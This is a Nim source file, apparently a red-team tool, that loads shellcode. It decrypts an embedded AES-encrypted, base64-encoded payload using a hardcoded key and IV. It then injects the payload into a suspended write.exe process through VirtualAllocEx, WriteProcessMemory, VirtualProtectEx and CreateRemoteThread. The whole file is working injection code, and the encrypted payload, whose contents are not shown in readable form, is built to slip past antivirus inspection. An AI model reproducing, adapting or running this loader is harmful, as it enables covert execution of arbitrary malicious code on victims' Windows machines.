#[
    Reference: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/shellcode_bin.nim
    Reference: https://github.com/S3cur3Th1sSh1t/Creds/blob/master/nim/encrypted_shellcode_loader.nim

  - Same injection technique as shellcode_hollowing.nim
  - Decryption working correctly now.
  - Copy IV, key, and encrypted shellcode output from encrypt_aes.nim into the matching fields near the bottom of this file

  TODO:
    - Update to make more modular to avoid needing to re-compile each time (see 2nd reference above)

]#

import winim/lean
import osproc
import nimcrypto
import base64

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

  return result

proc decryptAES(shellcode: string, aes_key: string, iv: string): string =
  var
    dctx: CTR[aes256]
    key = fromHex(aes_key)
    iv = fromHex(iv)
    enctext: seq[byte] = fromHex(shellcode)
    dectext: seq[byte] = newSeq[byte](len(fromHex(shellcode)))

  dctx.init(key, iv)
  dctx.decrypt(enctext, dectext)
  dctx.clear()

  #echo "Encrypted text: ", toHex(enctext)
  #echo "Decrypted text: ", toHex(dectext)

  return toHex(dectext)

proc injectCreateRemoteThread[byte](shellcode: openarray[byte]): void =

  let tProcess = startProcess("write.exe")
  tProcess.suspend()
  defer: tProcess.close()

  #echo "[*] Target Process: ", tProcess.processID

  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](tProcess.processID))
  defer: CloseHandle(pHandle)

  #echo "[*] pHandle: ", pHandle

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READWRITE)

  var bytesWritten: SIZE_T
  let wSuccess = WriteProcessMemory(pHandle, rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len),addr bytesWritten)

  #echo "[*] WriteProcessMemory: ", bool(wSuccess)
  #echo "    \\-- bytes written: ", bytesWritten
  #echo ""
  
  #DEBUG
  #var consoleInput = readLine(stdin);

  var oldProtect: DWORD
  let protSuccess = VirtualProtectEx(pHandle, cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ, addr oldProtect)

  # echo "[*] VirtualProtect: ", bool(protSuccess)
  # echo "    \\-- Changed memory protection back to RX instead of RWX"
  # echo ""

  let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
  defer: CloseHandle(tHandle)

  # echo "[*] tHandle: ", tHandle
  # echo "[+] Injected"

when defined(windows):

  # This is essentially the equivalent of 'if __name__ == '__main__' in python
  when isMainModule:
    # Replace these values with IV, AES key, and encrypted shellcode printed by encrypt_aes.nim
    let iv = "EE9B4C89192F8D87DB36A4A27C1AA576"
    let key = "BACF17571CF7ADB7796B3BD186063E44C8935CCBB15366F2C2156EA7CADDC4DB"
    var shellcode_enc = "A052BFF4AFFA14AA8F9B8BB33EBE3A6C4EC2835127AB493449E3D41D8B61A7993DB4D1DEC5C035F644B0E2CF9CF4DBD46BDA104B3856F9CE78FDB00A8FFA798C51CE81D36E3C7028D8F5870E6755B002A33DFD4A8CF428BB15C702B530426B7D9E8660A90F9254D9E3578469E278D774909E38567E0D31996925EFC88DDAB1477707FF6314A1AF138578E4D3AD7154339CDD324D8275998481F1F4949D9E6D656CD33B8A42C1CBE0942C6787F697EBA34CC8C22263519365A0D2424EE2C5FB9165B15F7A31EFFD88484AB3DA7C9486E6CD5E59F12DB4269C1D721B2C9E83C427BB071CE8CD26A7228FBC4F703956D37904BBC60C32BA5CAF9DAC8647525D0BD050747C9D626875AD375E46A57D5F9CAD0EFC161CD9948392AD6C7A042C73AB239FA0E3A8E8FB9CF15CE823531511D1511ADC349A36CAA265BA536947D360119EB91006891303F0DCDA0B22CFD320358FD276D323A39D51FDEAA7AA46FAF49B1DBAA6491961DA583F317A487263EB4C233593A7AE7B1E4EDF8A0202DDB4D35B789B5612BCD84961E2"
    var shellcode: seq[byte] = newSeq[byte](len(fromHex(shellcode_enc)))

    var shellcode_b64 = toString(fromHex(decryptAES(shellcode_enc, key, iv)))
    #echo "B64 shellcode: ", shellcode_b64
    shellcode = toByteSeq(decode(shellcode_b64))
    injectCreateRemoteThread(shellcode)